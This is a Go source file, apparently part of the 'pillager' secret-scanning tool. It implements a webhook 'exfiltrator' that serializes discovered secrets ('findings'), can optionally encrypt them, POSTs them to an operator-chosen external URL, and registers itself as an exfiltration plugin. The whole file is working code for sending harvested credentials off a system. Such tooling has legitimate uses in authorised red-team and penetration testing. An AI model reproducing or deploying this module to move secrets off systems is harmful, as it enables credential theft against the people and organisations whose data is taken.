package webhook

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
)

// WebhookExfiltrator exfiltrates findings via HTTP webhook.
type WebhookExfiltrator struct {
	url           string
	headers       map[string]string
	encryptionKey []byte
	compress      bool
	client        *http.Client
}

// NewWebhookExfiltrator creates a new webhook exfiltrator.
func NewWebhookExfiltrator(cfg exfil.Config) (*WebhookExfiltrator, error) {
	if cfg.Webhook == nil {
		return nil, fmt.Errorf("webhook configuration is required")
	}

	if cfg.Webhook.URL == "" {
		return nil, fmt.Errorf("webhook url is required")
	}

	headers := make(map[string]string)
	if cfg.Webhook.Headers != nil {
		for key, value := range cfg.Webhook.Headers {
			headers[key] = value
		}
	}

	if _, ok := headers["Content-Type"]; !ok {
		headers["Content-Type"] = "application/json"
	}

	var encryptionKey []byte
	var err error
	if cfg.EncryptionKey != "" {
		encryptionKey, err = exfil.LoadEncryptionKey(cfg.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("failed to load encryption key: %w", err)
		}
	}

	timeout := 30 * time.Second
	if cfg.Webhook.Timeout != nil {
		timeout = *cfg.Webhook.Timeout
	}

	return &WebhookExfiltrator{
		url:           cfg.Webhook.URL,
		headers:       headers,
		encryptionKey: encryptionKey,
		compress:      cfg.Compress,
		client: &http.Client{
			Timeout: timeout,
		},
	}, nil
}

// Exfiltrate sends findings to the webhook URL.
func (w *WebhookExfiltrator) Exfiltrate(ctx context.Context, findings []pillager.Finding) error {
	if len(findings) == 0 {
		return nil
	}

	data, err := exfil.SerializeFindings(findings)
	if err != nil {
		return fmt.Errorf("failed to serialize findings: %w", err)
	}

	if w.encryptionKey != nil {
		data, err = exfil.Encrypt(data, w.encryptionKey)
		if err != nil {
			return fmt.Errorf("failed to encrypt data: %w", err)
		}
		w.headers["Content-Type"] = "application/octet-stream"
	}

	req, err := http.NewRequestWithContext(ctx, "POST", w.url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	for key, value := range w.headers {
		req.Header.Set(key, value)
	}

	resp, err := w.client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send webhook: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("webhook returned error status: %d", resp.StatusCode)
	}

	return nil
}

func (w *WebhookExfiltrator) Close() error {
	w.client.CloseIdleConnections()
	return nil
}

func init() {
	exfil.Register("webhook", func(cfg exfil.Config) (exfil.Exfiltrator, error) {
		return NewWebhookExfiltrator(cfg)
	})
}
